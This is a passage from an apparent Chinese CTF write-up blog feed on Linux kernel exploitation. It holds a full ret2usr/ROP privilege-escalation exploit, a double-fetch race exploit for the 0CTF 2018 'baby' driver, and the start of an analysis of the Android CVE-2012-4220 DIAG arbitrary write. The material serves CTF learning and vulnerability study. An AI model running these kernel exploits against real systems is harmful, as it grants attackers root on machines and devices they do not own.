class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> user_cs, user_ss, user_rflags, user_sp;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">save_status</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    __asm__(<span class="string">"mov user_cs, cs;"</span></span><br><span class="line">            <span class="string">"mov user_ss, ss;"</span></span><br><span class="line">            <span class="string">"mov user_sp, rsp;"</span></span><br><span class="line">            <span class="string">"pushf;"</span></span><br><span class="line">            <span class="string">"pop user_rflags;"</span></span><br><span class="line">            );</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"[*]status has been saved."</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">get_shell</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    system(<span class="string">"/bin/sh"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> commit_creds = <span class="number">0</span>, prepare_kernel_cred = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">size_t</span> raw_vmlinux_base = <span class="number">0xffffffff81000000</span>;</span><br><span class="line"><span class="keyword">size_t</span> vmlinux_base = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">size_t</span> find_symbols()</span><br><span class="line">&#123;</span><br><span class="line">    FILE* kallsyms_fd = fopen(<span class="string">"/tmp/kallsyms"</span>, <span class="string">"r"</span>);</span><br><span class="line">    <span class="comment">/* FILE* kallsyms_fd = fopen("./test_kallsyms", "r"); */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(kallsyms_fd &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"[*]open kallsyms error!"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">0x30</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">while</span>(fgets(buf, <span class="number">0x30</span>, kallsyms_fd))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(commit_creds &amp; prepare_kernel_cred)</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">strstr</span>(buf, <span class="string">"commit_creds"</span>) &amp;&amp; !commit_creds)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">/* puts(buf); */</span></span><br><span class="line">            <span class="keyword">char</span> hex[<span class="number">20</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">            <span class="built_in">strncpy</span>(hex, buf, <span class="number">16</span>);</span><br><span class="line">            <span class="comment">/* printf("hex: %s\n", hex); */</span></span><br><span class="line">            <span class="built_in">sscanf</span>(hex, <span class="string">"%llx"</span>, &amp;commit_creds);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"commit_creds addr: %p\n"</span>, commit_creds);</span><br><span class="line">            vmlinux_base = commit_creds - <span class="number">0x9c8e0</span>;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"vmlinux_base addr: %p\n"</span>, vmlinux_base);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">strstr</span>(buf, <span class="string">"prepare_kernel_cred"</span>) &amp;&amp; !prepare_kernel_cred)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">/* puts(buf); */</span></span><br><span class="line">            <span class="keyword">char</span> hex[<span class="number">20</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">            <span class="built_in">strncpy</span>(hex, buf, <span class="number">16</span>);</span><br><span class="line">            <span class="built_in">sscanf</span>(hex, <span class="string">"%llx"</span>, &amp;prepare_kernel_cred);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"prepare_kernel_cred addr: %p\n"</span>, prepare_kernel_cred);</span><br><span class="line">            vmlinux_base = prepare_kernel_cred - <span class="number">0x9cce0</span>;</span><br><span class="line">            <span class="comment">/* printf("vmlinux_base addr: %p\n", vmlinux_base); */</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!(prepare_kernel_cred &amp; commit_creds))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"[*]Error!"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">get_root</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span>* (*pkc)(<span class="keyword">int</span>) = prepare_kernel_cred;</span><br><span class="line">    <span class="keyword">void</span> (*cc)(<span class="keyword">char</span>*) = commit_creds;</span><br><span class="line">    (*cc)((*pkc)(<span class="number">0</span>));</span><br><span class="line">    <span class="comment">/* puts("[*] root now."); */</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">set_off</span><span class="params">(<span class="keyword">int</span> fd, <span class="keyword">long</span> <span class="keyword">long</span> idx)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[*]set off to %ld\n"</span>, idx);</span><br><span class="line">    ioctl(fd, <span class="number">0x6677889C</span>, idx);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">core_read</span><span class="params">(<span class="keyword">int</span> fd, <span class="keyword">char</span> *buf)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"[*]read to buf."</span>);</span><br><span class="line">    ioctl(fd, <span class="number">0x6677889B</span>, buf);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">core_copy_func</span><span class="params">(<span class="keyword">int</span> fd, <span class="keyword">long</span> <span class="keyword">long</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[*]copy from user with size: %ld\n"</span>, size);</span><br><span class="line">    ioctl(fd, <span class="number">0x6677889A</span>, size);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    find_symbols();</span><br><span class="line">    <span class="keyword">size_t</span> offset = vmlinux_base - raw_vmlinux_base;</span><br><span class="line">    save_status();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> fd = open(<span class="string">"/proc/core"</span>,O_RDWR);</span><br><span class="line">    set_off(fd, <span class="number">0x40</span>);</span><br><span class="line">    <span class="keyword">size_t</span> buf[<span class="number">0x40</span>/<span class="number">8</span>];</span><br><span class="line">    core_read(fd, buf);</span><br><span class="line">    <span class="keyword">size_t</span> canary = buf[<span class="number">0</span>];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[*]canary : %p\n"</span>, canary);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">size_t</span> rop[<span class="number">0x30</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    rop[<span class="number">8</span>] = canary ;</span><br><span class="line">    rop[<span class="number">10</span>] = (<span class="keyword">size_t</span>)get_root;</span><br><span class="line">    rop[<span class="number">11</span>] = <span class="number">0xffffffff81a012da</span> + offset; <span class="comment">// swapgs; popfq; ret</span></span><br><span class="line">    rop[<span class="number">12</span>] = <span class="number">0</span>;</span><br><span class="line">    rop[<span class="number">13</span>] = <span class="number">0xffffffff81050ac2</span> + offset; <span class="comment">// iretq; ret;</span></span><br><span class="line">    rop[<span class="number">14</span>] = (<span class="keyword">size_t</span>)get_shell;</span><br><span class="line">    rop[<span class="number">15</span>] = user_cs;</span><br><span class="line">    rop[<span class="number">16</span>] = user_rflags;</span><br><span class="line">    rop[<span class="number">17</span>] = user_sp;</span><br><span class="line">    rop[<span class="number">18</span>] = user_ss;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"[*] DEBUG: "</span>);</span><br><span class="line">    getchar();</span><br><span class="line">    write(fd, rop, <span class="number">0x30</span> * <span class="number">8</span>);</span><br><span class="line">    core_copy_func(fd, <span class="number">0xffffffffffff0000</span> | (<span class="number">0x100</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>跟ROP比较一下异同。</p><ol><li>通过读取 /tmp/kallsyms 获取 commit_creds 和 prepare_kernel_cred 的方法相同，同时根据这些偏移能确定 gadget 的地址。</li><li>leak canary 的方法也相同，通过控制全局变量 off 读出 canary。</li><li>与 kernel rop 做法不同的是 rop 链的构造<ol><li>kernel rop 通过 内核空间的 rop 链达到执行 commit_creds(prepare_kernel_cred(0)) 以提权目的，之后通过 swapgs; iretq 等返回到用户态，执行用户空间的 system(“/bin/sh”) 获取 shell</li><li>ret2usr 做法中，直接返回到用户空间构造的 commit_creds(prepare_kernel_cred(0)) （通过函数指针实现）来提权，虽然这两个函数位于内核空间，但此时我们是 ring 0 特权，因此可以正常运行。之后也是通过 swapgs; iretq 返回到用户态来执行用户空间的 system(“/bin/sh”)</li></ol></li></ol><h3 id="Double-Fetch-2018-0CTF-Finals-Baby-Kernel"><a href="#Double-Fetch-2018-0CTF-Finals-Baby-Kernel" class="headerlink" title="Double Fetch 2018 0CTF Finals Baby Kernel"></a>Double Fetch 2018 0CTF Finals Baby Kernel</h3><p>这个算是个线程安全问题吧，跟<code>time of check, time of use</code>感觉差不多。</p><p>这个题也比较简单，当 ioctl 中 cmd 参数为 0x6666 时，驱动将输出 flag 的加载地址。当 ioctl 中 cmd 参数为 0x1337 时，首先进行三个校验，接着对用户输入的内容与硬编码的 flag 进行逐字节比较，当一致时通过 printk 将 flag 输出出来。其中 _chk_range_not_ok 为检查指针及长度范围是否指向用户空间。我们要弄个进程不断地改它那个地址，赶在check之后use之前给它改了。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">signed</span> __int64 __<span class="function">fastcall <span class="title">baby_ioctl</span><span class="params">(__int64 a1, attr *a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  attr *v2; <span class="comment">// rdx</span></span><br><span class="line">  <span class="keyword">signed</span> __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp-5Ch] [rbp-5Ch]</span></span><br><span class="line">  attr *v5; <span class="comment">// [rsp-58h] [rbp-58h]</span></span><br><span class="line"></span><br><span class="line">  _fentry__(a1, a2);</span><br><span class="line">  v5 = v2;</span><br><span class="line">  <span class="keyword">if</span> ( (_DWORD)a2 == <span class="number">0x6666</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    printk(<span class="string">"Your flag is at %px! But I don't think you know it's content\n"</span>, flag);</span><br><span class="line">    result = <span class="number">0L</span>L;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( (_DWORD)a2 == <span class="number">0x1337</span></span><br><span class="line">         &amp;&amp; !_chk_range_not_ok((__int64)v2, <span class="number">16L</span>L, *(_QWORD *)(__readgsqword((<span class="keyword">unsigned</span> __int64)&amp;current_task) + <span class="number">4952</span>))</span><br><span class="line">         &amp;&amp; !_chk_range_not_ok(</span><br><span class="line">               v5-&gt;flag_str,</span><br><span class="line">               SLODWORD(v5-&gt;flag_len),</span><br><span class="line">               *(_QWORD *)(__readgsqword((<span class="keyword">unsigned</span> __int64)&amp;current_task) + <span class="number">4952</span>))</span><br><span class="line">         &amp;&amp; LODWORD(v5-&gt;flag_len) == <span class="built_in">strlen</span>(flag) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="built_in">strlen</span>(flag); ++i )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( *(_BYTE *)(v5-&gt;flag_str + i) != flag[i] )</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0x16</span>LL;</span><br><span class="line">    &#125;</span><br><span class="line">    printk(<span class="string">"Looks like the flag is not a secret anymore. So here is it %s\n"</span>, flag);</span><br><span class="line">    result = <span class="number">0L</span>L;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    result = <span class="number">0xE</span>LL;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>以下是exp。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// gcc -static exp.c -lpthread -o exp</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">char</span> *<span class="title">strstr</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *haystack, <span class="keyword">const</span> <span class="keyword">char</span> *needle)</span></span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE         <span class="comment">/* See feature_test_macros(7) */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">char</span> *<span class="title">strcasestr</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *haystack, <span class="keyword">const</span> <span class="keyword">char</span> *needle)</span></span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> TRYTIME 0x1000  <span class="comment">//碰撞次数</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LEN 0x1000</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">attr</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">char</span> *flag;</span><br><span class="line">    <span class="keyword">size_t</span> len;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> addr;</span><br><span class="line"><span class="keyword">int</span> finish =<span class="number">0</span>;</span><br><span class="line"><span class="keyword">char</span> buf[LEN+<span class="number">1</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="comment">//线程函数，不断修改flag指向的地址为内核中flag地址</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">change_attr_value</span><span class="params">(<span class="keyword">void</span> *s)</span></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">attr</span> * <span class="title">s1</span> = <span class="title">s</span>;</span></span><br><span class="line">    <span class="keyword">while</span>(finish==<span class="number">0</span>)&#123;</span><br><span class="line">    s1-&gt;flag = addr;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> addr_fd;</span><br><span class="line">    <span class="keyword">char</span> *idx;</span><br><span class="line">    <span class="keyword">int</span> fd = open(<span class="string">"/dev/baby"</span>,<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">int</span> ret = ioctl(fd,<span class="number">0x6666</span>);</span><br><span class="line">    <span class="keyword">pthread_t</span> t1;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">attr</span> <span class="title">t</span>;</span></span><br><span class="line">    setvbuf(<span class="built_in">stdin</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">0</span>);</span><br><span class="line">    setvbuf(<span class="built_in">stdout</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">0</span>);</span><br><span class="line">    setvbuf(<span class="built_in">stderr</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">0</span>);</span><br><span class="line">    <span class="comment">//获取内核硬编码的flag地址</span></span><br><span class="line">    system(<span class="string">"dmesg &gt; /tmp/record.txt"</span>);</span><br><span class="line">    addr_fd = open(<span class="string">"/tmp/record.txt"</span>,O_RDONLY);</span><br><span class="line">    lseek(addr_fd,-LEN,SEEK_END);</span><br><span class="line">    read(addr_fd,buf,LEN);</span><br><span class="line">    close(addr_fd);</span><br><span class="line">    idx = <span class="built_in">strstr</span>(buf,<span class="string">"Your flag is at "</span>);</span><br><span class="line">    <span class="keyword">if</span> (idx == <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"[-]Not found addr"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        idx+=<span class="number">16</span>;</span><br><span class="line">        addr = strtoull(idx,idx+<span class="number">16</span>,<span class="number">16</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"[+]flag addr: %p\n"</span>,addr);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//构造attr数据结构</span></span><br><span class="line">    t.len = <span class="number">33</span>;</span><br><span class="line">    t.flag = buf;</span><br><span class="line">    <span class="comment">//新建恶意线程</span></span><br><span class="line">    pthread_create(&amp;t1, <span class="literal">NULL</span>, change_attr_value,&amp;t);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;TRYTIME;i++)&#123;</span><br><span class="line">        ret = ioctl(fd, <span class="number">0x1337</span>, &amp;t);</span><br><span class="line">        t.flag = buf;</span><br><span class="line">    &#125;</span><br><span class="line">    finish = <span class="number">1</span>;</span><br><span class="line">    pthread_join(t1, <span class="literal">NULL</span>);</span><br><span class="line">    close(fd);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"[+]result is :"</span>);</span><br><span class="line">    system(<span class="string">"dmesg | grep flag"</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;致谢参考：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;a href=&quot;https://www.anquanke.com/post/id/201454&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://www.anquanke.com/post/id/2014
      
    
    </summary>
    
    
      <category term="CTF" scheme="https://github.com/Cracke-S-J/categories/CTF/"/>
    
      <category term="pwn" scheme="https://github.com/Cracke-S-J/categories/CTF/pwn/"/>
    
    
      <category term="CTF" scheme="https://github.com/Cracke-S-J/tags/CTF/"/>
    
      <category term="pwn" scheme="https://github.com/Cracke-S-J/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>Android 内核相关 CVE</title>
    <link href="https://github.com/Cracke-S-J/2020/04/01/Android%E7%9B%B8%E5%85%B3CVE/"/>
    <id>https://github.com/Cracke-S-J/2020/04/01/Android%E7%9B%B8%E5%85%B3CVE/</id>
    <published>2020-04-01T08:37:11.000Z</published>
    <updated>2020-05-24T14:52:11.520Z</updated>
    
    <content type="html"><![CDATA[<p>原来 Android 就是这么被 root 的。结尾有彩蛋，Janus 分析（这算什么彩蛋）。</p><p>先贴一个<a href="https://elixir.bootlin.com/linux/" target="_blank" rel="noopener">Linux源码阅读的网站</a>。</p><h2 id="背景知识"><a href="#背景知识" class="headerlink" title="背景知识"></a>背景知识</h2><h3 id="ioctl-函数"><a href="#ioctl-函数" class="headerlink" title="ioctl()函数"></a>ioctl()函数</h3><p><a href="https://blog.csdn.net/gemmem/article/details/7268533" target="_blank" rel="noopener">ioctl()函数详解</a></p><h2 id="CVE-2012-4220-libdiagexploit"><a href="#CVE-2012-4220-libdiagexploit" class="headerlink" title="CVE-2012-4220(libdiagexploit)"></a>CVE-2012-4220(libdiagexploit)</h2><h3 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h3><blockquote><p>diagchar_core.c in the Qualcomm Innovation Center (QuIC) Diagnostics (aka DIAG) kernel-mode driver for Android 2.3 through 4.2 allows attackers to execute arbitrary code or cause a denial of service (incorrect pointer dereference) via an application that uses crafted arguments in a local diagchar_ioctl call.</p></blockquote><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><ol><li>对于用户态传递的参数 ioarg 没有检验直接使用。传递一个无效指针即可造成拒绝服务。</li><li>对 delay_params 中的 rsp_ptr 以及 num_bytes_ptr 两个用户态的指针仅做了非空判断就直接使用。传递无效指针可造成拒绝服务，传递其他地址可以造成任意地址写入攻击。</li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// file: drivers/char/diag/diagchar_core.c</span></span><br><span class="line"><span class="comment">// function: diagchar_ioctl</span></span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (iocmd == DIAG_IOCTL_GET_DELAYED_RSP_ID) &#123;</span><br><span class="line">  struct diagpkt_delay_params *delay_params =</span><br><span class="line">        (struct diagpkt_delay_params *) ioarg;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ((delay_params-&gt;rsp_ptr) &amp;&amp;</span><br><span class="line">   (delay_params-&gt;size == <span class="keyword">sizeof</span>(delayed_rsp_id)) &amp;&amp;</span><br><span class="line">       (delay_params-&gt;num_bytes_ptr)) &#123;</span><br><span class="line">    *((<span class="keyword">uint16_t</span> *)delay_params-&gt;rsp_ptr) =</span><br><span class="line">      DIAGPKT_NEXT_DELAYED_RSP_ID(delayed_rsp_id);</span><br><span class="line">    *(delay_params-&gt;num_bytes_ptr) = <span class="keyword">sizeof</span>(delayed_rsp_id);</span><br><span class="line">    success = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><p>先看一下相关的代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">uint16_t</span> delayed_rsp_id = <span class="number">1</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DIAGPKT_MAX_DELAYED_RSP 0xFFFF</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DIAGPKT_NEXT_DELAYED_RSP_ID(x) \</span></span><br><span class="line">        ((x &lt; DIAGPKT_MAX_DELAYED_RSP) ? x++ : DIAGPKT_MAX_DELAYED_RSP)</span><br></pre></td></tr></table></figure><p>需要注意以下几点：</p><ol><li>delay_params-&gt;rsp_ptr 被当作 16 位的指针处理，写入的内容是 delayed_rsp_id 的值，这个值的范围是 0x2 ~ 0xFFFF。</li><li>如果希望向特定的地址写入特定的值，需要获取到当前的 delayed_rsp_id 的值，然后用目标值减去当前值，得到了循环的次数，最后循环发送 ioctl 即可将特定地址的值修改为我们想要的值。</li><li>如果 delayed_rsp_id 的值要比目标的值大，则可以使用 num_bytes_ptr 来重置 delayed_rsp_id 的值为 2。</li></ol><p>写得比较完整的利用代码可以参考 <a href="https://github.com/android-rooting-tools/libdiagexploit">这里</a>，不过这个 exp 有个问题。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span 